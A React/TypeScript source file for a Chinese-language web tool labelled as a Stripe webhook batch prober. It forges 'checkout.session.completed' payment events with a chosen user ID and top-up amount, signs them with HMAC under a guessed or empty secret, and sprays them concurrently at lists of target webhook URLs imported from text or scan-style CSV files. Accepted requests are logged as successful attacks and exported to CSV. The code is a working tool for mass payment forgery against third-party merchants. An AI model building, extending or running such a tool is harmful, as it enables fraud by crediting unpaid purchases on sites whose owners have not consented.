import { useState, useRef } from 'react';
import { Terminal, ShieldAlert, Zap, Activity, CheckCircle, XCircle, Globe, List, Upload, Download } from 'lucide-react';
import CryptoJS from 'crypto-js';
import clsx from 'clsx';

interface LogEntry {
  time: string;
  type: 'info' | 'success' | 'error' | 'request' | 'response' | 'warning';
  message: string;
  details?: any;
}

interface TestResult {
  url: string;
  status: string;
  statusCode: number | string;
  message: string;
}

function App() {
  const [urlsText, setUrlsText] = useState('');
  const [clientId, setClientId] = useState('USR-9999-HACK-123456');
  const [amount, setAmount] = useState(1); // 默认充值金额修改为 1
  const [secret, setSecret] = useState('');
  const [concurrency, setConcurrency] = useState(5); // 并发线程数
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [results, setResults] = useState<TestResult[]>([]);
  const [isHacking, setIsHacking] = useState(false);

  const isHackingRef = useRef(false);
  const resultsRef = useRef<TestResult[]>([]);

  const addLog = (type: LogEntry['type'], message: string, details?: any) => {
    setLogs(prev => [...prev, {
      time: new Date().toLocaleTimeString(),
      type,
      message,
      details
    }]);
  };

  const forgeSignature = (payloadStr: string, secretKey: string, timestamp: string) => {
    const signedPayload = `${timestamp}.${payloadStr}`;
    const hash = CryptoJS.HmacSHA256(signedPayload, secretKey);
    const v1 = hash.toString(CryptoJS.enc.Hex);
    return `t=${timestamp},v1=${v1}`;
  };

  const exportCSV = () => {
    if (resultsRef.current.length === 0) return;
    
    // CSV Header
    const headers = ["目标 URL", "测试状态", "HTTP 状态码", "详细信息"];
    
    // CSV Rows
    const rows = resultsRef.current.map(r => [
      `"${r.url.replace(/"/g, '""')}"`,
      `"${r.status.replace(/"/g, '""')}"`,
      `"${r.statusCode}"`,
      `"${r.message.replace(/"/g, '""')}"`
    ]);

    // Add BOM for Excel compatibility with Chinese characters
    const csvContent = "\uFEFF" + [headers.join(","), ...rows.map(r => r.join(","))].join("\n");
    
    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
    const link = document.createElement("a");
    const url = URL.createObjectURL(blob);
    
    link.setAttribute("href", url);
    link.setAttribute("download", `stripe_vuln_scan_${new Date().getTime()}.csv`);
    link.style.visibility = 'hidden';
    
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const stopAttack = () => {
    isHackingRef.current = false;
    setIsHacking(false);
    addLog('warning', '⏹️ 用户手动终止了批量探测任务。');
  };

  const executeAttack = async () => {
    const urls = urlsText.split('\n').map(u => u.trim()).filter(u => u);

    if (urls.length === 0) {
      addLog('error', '请输入至少一个目标 Webhook URL (需以 http:// 或 https:// 开头)');
      return;
    }

    setIsHacking(true);
    isHackingRef.current = true;
    setLogs([]); // Clear previous logs
    setResults([]);
    resultsRef.current = [];

    addLog('info', `=== 开始多线程批量探测，共 ${urls.length} 个目标，并发数: ${concurrency} ===`);

    let globalIndex = 0;
    const totalUrls = urls.length;

    // 真正的并发 Worker 函数
    const worker = async (workerId: number) => {
      while (globalIndex < totalUrls && isHackingRef.current) {
        const currentIndex = globalIndex++;
        const currentUrl = urls[currentIndex];

        if (!currentUrl.startsWith('http')) {
          addLog('error', `[W${workerId}] 跳过无效 URL: ${currentUrl}`);
          resultsRef.current.push({ url: currentUrl, status: '无效地址', statusCode: 'N/A', message: '未以 http/https 开头' });
          setResults([...resultsRef.current]);
          continue;
        }

        addLog('info', `▶ [W${workerId}] 探测中 (${currentIndex + 1}/${totalUrls}): ${currentUrl}`);
        
        // Generate unique payload per request to avoid caching issues
        const payload = {
          id: "evt_test_forgery_" + Math.random().toString(36).substring(7),
          type: "checkout.session.completed",
          data: {
            object: {
              id: "cs_test_hacked_" + Math.random().toString(36).substring(7),
              client_reference_id: clientId,
              status: "complete",
              payment_status: "paid",
              amount_total: amount * 100 // Stripe expects cents
            }
          }
        };

        const jsonBody = JSON.stringify(payload);
        const timestamp = Math.floor(Date.now() / 1000).toString();
        const signature = forgeSignature(jsonBody, secret, timestamp);

        const fetchUrl = '/api/proxy';
        const extraHeaders: Record<string, string> = {
          'X-Target-Url': currentUrl
        };
        
        try {
          const response = await fetch(fetchUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Stripe-Signature': signature,
              ...extraHeaders
            },
            body: jsonBody
          });

          if (response.ok) {
            addLog('success', `🎉 [W${workerId}] 目标 [${currentUrl}] 攻击成功！可能存在漏洞。`);
            resultsRef.current.push({ url: currentUrl, status: '存在漏洞', statusCode: response.status, message: '服务端接受了伪造签名并返回成功状态码' });
          } else {
            addLog('error', `❌ [W${workerId}] 目标 [${currentUrl}] 攻击失败 (状态码: ${response.status})。`);
            resultsRef.current.push({ url: currentUrl, status: '安全防御', statusCode: response.status, message: '服务端拒绝了伪造请求' });
          }
        } catch (error: any) {
          addLog('warning', `⚠️ [W${workerId}] 目标 [${currentUrl}] 请求失败: ${error.message}`);
          resultsRef.current.push({ url: currentUrl, status: '请求失败', statusCode: 'ERROR', message: error.message });
        }
        
        setResults([...resultsRef.current]);
      }
    };

    // 启动指定数量的并发 Worker
    const workers = [];
    const activeConcurrency = Math.min(concurrency, totalUrls);
    for (let i = 0; i < activeConcurrency; i++) {
      workers.push(worker(i + 1));
    }

    // 等待所有 Worker 执行完毕
    await Promise.all(workers);

    if (isHackingRef.current) {
      addLog('info', `\n=== 批量探测任务执行完毕，共测试 ${totalUrls} 个目标 ===`);
      setIsHacking(false);
      isHackingRef.current = false;
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-300 font-sans selection:bg-emerald-500/30 pb-10">
      {/* Header */}
      <header className="border-b border-slate-800 bg-slate-900/80 backdrop-blur-md sticky top-0 z-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 h-14 sm:h-16 flex items-center justify-between">
          <div className="flex items-center gap-2 sm:gap-3">
            <div className="p-1.5 sm:p-2 bg-indigo-500/10 rounded-lg shrink-0 border border-indigo-500/20">
              <Globe className="w-5 h-5 sm:w-6 sm:h-6 text-indigo-400" />
            </div>
            <div className="min-w-0">
              <h1 className="font-bold text-slate-100 text-sm sm:text-base truncate">Stripe Webhook 批量探测器 (专业版)</h1>
              <p className="text-[10px] sm:text-xs text-slate-500 truncate">高并发漏洞探测与结果导出工具</p>
            </div>
          </div>
          <div className="flex items-center shrink-0 ml-2">
            <span className="flex items-center gap-1.5 sm:gap-2 text-[10px] sm:text-xs font-medium px-2 sm:px-3 py-1 sm:py-1.5 rounded-full bg-slate-800 text-slate-400 border border-slate-700">
              <Activity className="w-3 h-3 sm:w-4 sm:h-4 text-emerald-500" />
              <span className="hidden sm:inline">系统就绪</span>
              <span className="sm:hidden">就绪</span>
            </span>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 py-6 sm:py-8 grid lg:grid-cols-12 gap-6 sm:gap-8">
        
        {/* Left Column: Controls & Flow */}
        <div className="lg:col-span-4 space-y-6">
          
          {/* Attack Configuration */}
          <section className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden shadow-2xl shadow-black/50 flex flex-col h-full max-h-[800px]">
            <div className="px-4 sm:px-5 py-3 sm:py-4 border-b border-slate-800 flex items-center gap-2 shrink-0">
              <List className="w-4 h-4 sm:w-5 sm:h-5 text-amber-500" />
              <h2 className="font-semibold text-slate-100 text-sm sm:text-base">批量探测参数配置</h2>
            </div>
            
            <div className="p-4 sm:p-5 space-y-4 sm:space-y-5 overflow-y-auto scrollbar-thin scrollbar-thumb-slate-700">
              {/* Custom URLs Input */}
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <label className="text-[10px] sm:text-xs font-semibold text-indigo-400 uppercase tracking-wider flex items-center gap-1">
                    <Globe className="w-3 h-3" /> 目标 Webhook URLs (每行一个)
                  </label>
                  <label className="cursor-pointer flex items-center gap-1 text-[10px] sm:text-[11px] bg-indigo-500/20 hover:bg-indigo-500/30 text-indigo-300 px-2 py-1 rounded border border-indigo-500/30 transition-colors">
                    <Upload className="w-3 h-3" /> 导入本地文件
                    <input 
                      type="file" 
                      accept=".txt,.csv" 
                      className="hidden" 
                      onChange={(e) => {
                        const file = e.target.files?.[0];
                        if (!file) return;
                        const reader = new FileReader();
                        reader.onload = (event) => {
                          const content = event.target?.result;
                          if (typeof content === 'string') {
                            let parsedUrls = content;
                            
                            // 针对 CSV 文件进行特殊处理
                            if (file.name.toLowerCase().endsWith('.csv')) {
                              const lines = content.split(/\r?\n/).filter(line => line.trim());
                              const extractedUrls: string[] = [];
                              
                              if (lines.length > 0) {
                                // 尝试识别表头
                                const headers = lines[0].split(',').map(h => h.trim().replace(/^"|"$/g, '').toLowerCase());
                                const hostIdx = headers.indexOf('host');
                                const protocolIdx = headers.indexOf('protocol');
                                
                                if (hostIdx !== -1 && protocolIdx !== -1) {
                                  addLog('info', `🔍 检测到特定结构的 CSV 文件 (包含 host 和 protocol 列)`);
                                  for (let i = 1; i < lines.length; i++) {
                                    const cells = lines[i].split(',').map(c => c.trim().replace(/^"|"$/g, ''));
                                    const host = cells[hostIdx];
                                    const protocol = cells[protocolIdx];
                                    if (host && protocol) {
                                      extractedUrls.push(`${protocol}://${host}/api/stripe/webhook`);
                                    }
                                  }
                                } else {
                                  addLog('info', `ℹ️ 未检测到特定表头，将扫描文件内所有以 http 开头的文本...`);
                                  lines.forEach(line => {
                                    const cells = line.split(',');
                                    cells.forEach(cell => {
                                      const trimmedCell = cell.trim().replace(/^"|"$/g, '');
                                      if (trimmedCell.startsWith('http://') || trimmedCell.startsWith('https://')) {
                                        extractedUrls.push(trimmedCell);
                                      }
                                    });
                                  });
                                }
                              }
                              
                              if (extractedUrls.length > 0) {
                                parsedUrls = extractedUrls.join('\n');
                                addLog('success', `✅ 成功解析 CSV 文件: ${file.name}，提取并构造出 ${extractedUrls.length} 个有效 URL。`);
                              } else {
                                addLog('warning', `⚠️ 在 CSV 文件 ${file.name} 中未能提取出有效的 URL。`);
                              }
                            } else {
                               addLog('success', `✅ 成功读取本地文本文件: ${file.name}。`);
                            }

                            setUrlsText(parsedUrls);
                          }
                        };
                        reader.readAsText(file);
                        e.target.value = ''; // Reset input
                      }} 
                    />
                  </label>
                </div>
                <textarea
                  value={urlsText}
                  onChange={(e) => setUrlsText(e.target.value)}
                  placeholder="http://localhost:8080/api/stripe/webhook&#10;https://api.example.com/stripe/webhook"
                  className="w-full bg-indigo-950/20 border border-indigo-500/30 rounded-lg px-3 sm:px-4 py-2 sm:py-2.5 text-sm text-indigo-200 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all placeholder:text-indigo-800/50 font-mono min-h-[120px] resize-y"
                />
              </div>

              {/* Secret Key */}
              <div className="space-y-2">
                <label className="text-[10px] sm:text-xs font-semibold text-slate-400 uppercase tracking-wider">签名密钥 (Secret)</label>
                <input
                  type="text"
                  value={secret}
                  onChange={(e) => setSecret(e.target.value)}
                  placeholder="留空以测试空密钥漏洞"
                  className="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 sm:px-4 py-2 sm:py-2.5 text-sm text-slate-300 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all placeholder:text-slate-600 font-mono"
                />
              </div>

              {/* Client ID */}
              <div className="space-y-2">
                <label className="text-[10px] sm:text-xs font-semibold text-slate-400 uppercase tracking-wider">伪造用户 ID</label>
                <input
                  type="text"
                  value={clientId}
                  onChange={(e) => setClientId(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 sm:px-4 py-2 sm:py-2.5 text-sm text-slate-300 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all font-mono"
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                {/* Amount */}
                <div className="space-y-2">
                  <label className="text-[10px] sm:text-xs font-semibold text-slate-400 uppercase tracking-wider">伪造充值金额</label>
                  <div className="relative">
                    <span className="absolute left-3 sm:left-4 top-1/2 -translate-y-1/2 text-slate-500 font-mono">$</span>
                    <input
                      type="number"
                      value={amount}
                      onChange={(e) => setAmount(Number(e.target.value))}
                      className="w-full bg-slate-950 border border-slate-700 rounded-lg pl-7 sm:pl-8 pr-3 sm:pr-4 py-2 sm:py-2.5 text-sm text-slate-300 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all font-mono"
                    />
                  </div>
                </div>

                {/* Concurrency Setting */}
                <div className="space-y-2">
                  <label className="text-[10px] sm:text-xs font-semibold text-slate-400 uppercase tracking-wider flex justify-between">
                    <span>并发线程数</span>
                    <span className="text-indigo-400 font-mono">{concurrency} 线程</span>
                  </label>
                  <input
                    type="range"
                    min="1"
                    max="20"
                    value={concurrency}
                    onChange={(e) => setConcurrency(Number(e.target.value))}
                    className="w-full h-10 accent-indigo-500 cursor-pointer"
                  />
                </div>
              </div>

              {/* Action Buttons */}
              <div className="flex gap-3 pt-2">
                <button
                  onClick={executeAttack}
                  disabled={isHacking}
                  className="flex-1 relative group overflow-hidden rounded-lg disabled:opacity-70 disabled:cursor-not-allowed active:scale-[0.98] transition-transform touch-manipulation"
                >
                  <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-indigo-600 to-blue-600 opacity-80 group-hover:opacity-100 transition-opacity"></div>
                  <div className="relative px-4 sm:px-6 py-3 sm:py-3.5 flex items-center justify-center gap-2 text-white font-bold tracking-wide text-sm sm:text-base">
                    {isHacking ? (
                      <span className="flex items-center gap-2">
                        <div className="w-4 h-4 sm:w-5 sm:h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                        多线程探测中...
                      </span>
                    ) : (
                      <span className="flex items-center gap-2">
                        <Zap className="w-4 h-4 sm:w-5 sm:h-5" />
                        开始批量探测
                      </span>
                    )}
                  </div>
                </button>

                {isHacking && (
                  <button
                    onClick={stopAttack}
                    className="px-4 py-3 bg-rose-500/20 text-rose-500 border border-rose-500/30 rounded-lg hover:bg-rose-500/30 transition-colors font-bold text-sm sm:text-base"
                  >
                    停止
                  </button>
                )}
              </div>
            </div>
          </section>

          {/* Explainer */}
          <section className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden shadow-lg p-4 sm:p-5 hidden lg:block">
            <h3 className="text-sm font-semibold text-slate-300 mb-4 flex items-center gap-2">
              <ShieldAlert className="w-4 h-4 text-indigo-400" />
              多线程并发探测说明
            </h3>
            <div className="space-y-4">
              <ul className="space-y-2 text-xs text-slate-400 list-disc pl-4">
                <li>通过设置并发线程数 (1-20)，可同时向多个目标发送探测请求。</li>
                <li>此操作极大地提高了数百个 URL 列表的扫描效率。</li>
                <li>扫描完成后，可在右侧终端头部点击【导出报告】将漏洞状态保存为 CSV 文件。</li>
                <li><span className="text-amber-500 font-bold">请注意</span>：并发过高可能导致您的网络或目标防火墙阻断连接，建议保持在 5-10 左右。</li>
              </ul>
            </div>
          </section>
        </div>

        {/* Right Column: Terminal */}
        <div className="lg:col-span-8 flex flex-col h-[600px] lg:h-[800px]">
          <section className="flex-1 bg-[#0a0a0a] border border-slate-800 rounded-xl overflow-hidden shadow-2xl shadow-black/50 flex flex-col font-mono text-xs sm:text-sm relative">
            
            {/* Terminal Header */}
            <div className="px-3 sm:px-4 py-2.5 sm:py-3 bg-slate-900 border-b border-slate-800 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Terminal className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-slate-500" />
                <span className="text-slate-400 text-[10px] sm:text-xs tracking-wider">并发探测终端 // STDOUT</span>
              </div>
              <div className="flex gap-3 items-center">
                {results.length > 0 && !isHacking && (
                  <button
                    onClick={exportCSV}
                    className="flex items-center gap-1 text-[10px] sm:text-xs bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-400 px-2.5 py-1 rounded border border-emerald-500/30 transition-all font-sans font-medium animate-in fade-in"
                  >
                    <Download className="w-3 h-3" /> 导出测试报告 (CSV)
                  </button>
                )}
                <div className="flex gap-1.5 ml-2">
                  <div className="w-2.5 h-2.5 sm:w-3 sm:h-3 rounded-full bg-rose-500/20 border border-rose-500/50"></div>
                  <div className="w-2.5 h-2.5 sm:w-3 sm:h-3 rounded-full bg-amber-500/20 border border-amber-500/50"></div>
                  <div className="w-2.5 h-2.5 sm:w-3 sm:h-3 rounded-full bg-emerald-500/20 border border-emerald-500/50"></div>
                </div>
              </div>
            </div>

            {/* Terminal Output */}
            <div className="flex-1 p-3 sm:p-5 overflow-y-auto space-y-3 scrollbar-thin scrollbar-thumb-slate-700 scrollbar-track-transparent pb-10">
              {logs.length === 0 ? (
                <div className="text-slate-600 flex items-center gap-2 h-full justify-center">
                  <Terminal className="w-4 h-4 sm:w-5 sm:h-5 opacity-50" />
                  等待输入目标 URL 列表并执行...
                </div>
              ) : (
                logs.map((log, index) => (
                  <div key={index} className="animate-in fade-in slide-in-from-bottom-2 duration-300">
                    <div className="flex items-start gap-2 sm:gap-3">
                      <span className="text-slate-600 shrink-0 select-none text-[10px] sm:text-xs pt-0.5 sm:pt-0">[{log.time}]</span>
                      <div className="flex-1 overflow-hidden">
                        
                        {/* Log Message */}
                        <span className={clsx(
                          "whitespace-pre-wrap break-words",
                          log.type === 'info' && "text-blue-400",
                          log.type === 'success' && "text-emerald-400 font-bold",
                          log.type === 'error' && "text-rose-400 font-bold",
                          log.type === 'warning' && "text-amber-500 font-semibold",
                          log.type === 'request' && "text-amber-400",
                          log.type === 'response' && "text-purple-400"
                        )}>
                          {log.type === 'success' && <CheckCircle className="w-3.5 h-3.5 sm:w-4 sm:h-4 inline mr-1 sm:mr-1.5 -mt-0.5 sm:-mt-1" />}
                          {log.type === 'error' && <XCircle className="w-3.5 h-3.5 sm:w-4 sm:h-4 inline mr-1 sm:mr-1.5 -mt-0.5 sm:-mt-1" />}
                          {log.type === 'warning' && <ShieldAlert className="w-3.5 h-3.5 sm:w-4 sm:h-4 inline mr-1 sm:mr-1.5 -mt-0.5 sm:-mt-1" />}
                          {log.message}
                        </span>
                      </div>
                    </div>
                  </div>
                ))
              )}
              {isHacking && (
                <div className="flex items-center gap-2 text-slate-500 animate-pulse mt-2">
                  <span className="w-1.5 h-3 sm:w-2 sm:h-4 bg-slate-500 block"></span>
                </div>
              )}
            </div>
          </section>
        </div>

      </main>
    </div>
  );
}

export default App;
